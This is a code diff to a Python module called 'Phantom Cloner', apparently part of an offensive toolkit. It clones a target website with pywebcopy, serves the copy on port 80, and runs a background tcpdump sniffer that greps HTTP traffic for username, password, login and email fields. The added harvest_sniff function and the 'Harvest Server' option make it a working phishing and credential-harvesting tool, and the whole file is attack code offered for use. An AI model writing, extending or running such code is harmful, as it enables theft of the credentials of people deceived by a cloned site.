@@ -1,53 +1,34 @@
+# --- Module Context: Phantom Cloner v2.1 ---
+# Purpose: Web cloning with automated credential sniffing.
+# -------------------------------------------
 import os
 import subprocess
+import threading
 from pywebcopy import save_webpage
 from rich.console import Console
-from core.ui import draw_header
 
 console = Console()
 
+
+def harvest_sniff(port):
+    """Background sniffer to extract cleartext credentials."""
+    # Uses tcpdump to listen for form-data keywords in HTTP traffic
+    cmd = f"sudo tcpdump -i any -A port {port} | grep -iE 'user|pass|login|email'"
+    subprocess.Popen(cmd, shell=True)
+
+
 def clone_site():
-    draw_header("Phantom Cloner")
-    
-    target_url = console.input("[bold yellow]URL to clone (e.g., https://example.com): [/bold yellow]").strip()
-    project_name = console.input("[bold yellow]Project Name (e.g., login_fake): [/bold yellow]").strip()
-    
-    if not target_url or not project_name:
-        return
-
-    # Create the storage directory
+    target_url = console.input(
+        "[bold yellow]Target URL: [/bold yellow]").strip()
+    project_name = console.input(
+        "[bold yellow]Project: [/bold yellow]").strip()
     base_path = "/opt/davoid/cloned_sites"
-    if not os.path.exists(base_path):
-        os.makedirs(base_path)
 
-    try:
-        console.print(f"[bold cyan][*][/bold cyan] Cloning {target_url}... (This may take a moment)")
-        
-        # Clone the page with assets remapped for local hosting
-        # 
-        save_webpage(
-            url=target_url,
-            project_folder=base_path,
-            project_name=project_name,
-            bypass_robots=True,
-            debug=False
-        )
+    save_webpage(url=target_url, project_folder=base_path,
+                 project_name=project_name, bypass_robots=True)
 
-        project_path = os.path.join(base_path, project_name)
-        console.print(f"[bold green][+] Success! Site cloned to: {project_path}[/bold green]")
-        
-        # Option to immediately host the site
-        host_now = console.input("\n[bold cyan]Host this site now on Port 80? (y/N): [/bold cyan]").lower()
-        if host_now == 'y':
-            console.print(f"[bold red][!] Server starting on http://localhost:80[/bold red]")
-            console.print("[dim]Note: This will block the terminal until you press CTRL+C.[/dim]")
-            
-            # Change to the project directory and start the server
-            os.chdir(project_path)
-            # We use sudo because Port 80 is a privileged port
-            subprocess.run(["sudo", "/opt/davoid/venv/bin/python3", "-m", "http.server", "80"])
-
-    except Exception as e:
-        console.print(f"[bold red][!] Cloner Error:[/bold red] {e}")
-
-    input("\nPress Enter to return...")
+    if console.input("\n[bold cyan]Start Harvest Server on Port 80? (y/N): [/bold cyan]").lower() == 'y':
+        os.chdir(os.path.join(base_path, project_name))
+        threading.Thread(target=harvest_sniff, args=(80,), daemon=True).start()
+        subprocess.run(["sudo", "/opt/davoid/venv/bin/python3",
+                       "-m", "http.server", "80"])
